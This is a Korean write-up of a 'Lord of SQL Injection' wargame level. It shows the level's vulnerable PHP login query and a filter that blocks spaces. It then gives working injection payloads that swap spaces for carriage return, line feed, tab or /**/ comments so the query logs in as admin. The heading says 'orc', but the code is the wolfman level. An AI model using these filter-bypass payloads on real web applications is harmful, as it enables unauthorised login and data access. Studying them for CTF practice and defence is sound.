# Lord of SQL Injection No.4 - orc
## 문제 출제 의도
' '(공백)없이 쿼리를 조작하여 해결 할 수 있는지 확인한다.
## 소스 코드 분석
+ 소스 코드  
wolfman의 소스 코드는 다음과 같다.
    ~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
    $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("wolfman"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석
    - GET방식으로 받은 pw에 공백이 있으면 "No whitespace ~_~"이 출력되고 문제풀이에 실패한다.
    - 문제 풀이에 성공하는 조건은 데이터베이스에서 받아온 id 값이 'admin'이면 통과이다.
## 문제 해결
+ 추가 문자열  
    'admin'을 id 값으로 받아오기 위해서는 다음과 같은 문자열이 URL뒤에 추가되어야 한다.
    ~~~
    ?pw=' or id='admin'-- -'
    ~~~
    그러나 공백을 입력하면 문제풀이에 실패함으로 공백을 대체할 문자들을 넣으면 문제풀이에 성공한다.  

+ CR(Carriage Return) 이용  
    ~~~
    ?pw='%0Dor%0Did='admin'--%0D-
    ~~~
    ASCII Code에서 Carriage Return은 0x0D에 해당한다.
    이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.

+ LF(Line Feed) 이용  
    ~~~
    ?pw='%0Aor%0Aid='admin'--%0A-
    ~~~
    ASCII Code에서 Line Feed은 0x0A에 해당한다.
    이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.

+ Tab 이용  
    ~~~
    ?pw='%09or%09id='admin'--%09-
    ~~~
    ASCII Code에서 Tab은 0x09에 해당한다.
    이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.

+ 주석 이용  
    ~~~
    pw='/**/or/**/id='admin'%23
    ~~~
    주석을 구문 사이에 입력하면 공백이 없어도 원활히 작동한다.
    이떄 #을 주석 대신 넣은 이유는 -- - 사이의 공백에 주석을 입력하면 정상적으로 작동하지 않기 때문이다.

**위와 같은 방법들 중 하나로 해결하면 $result['id']에 'admin'이 들어가므로 문제 해결에 성공한다.**
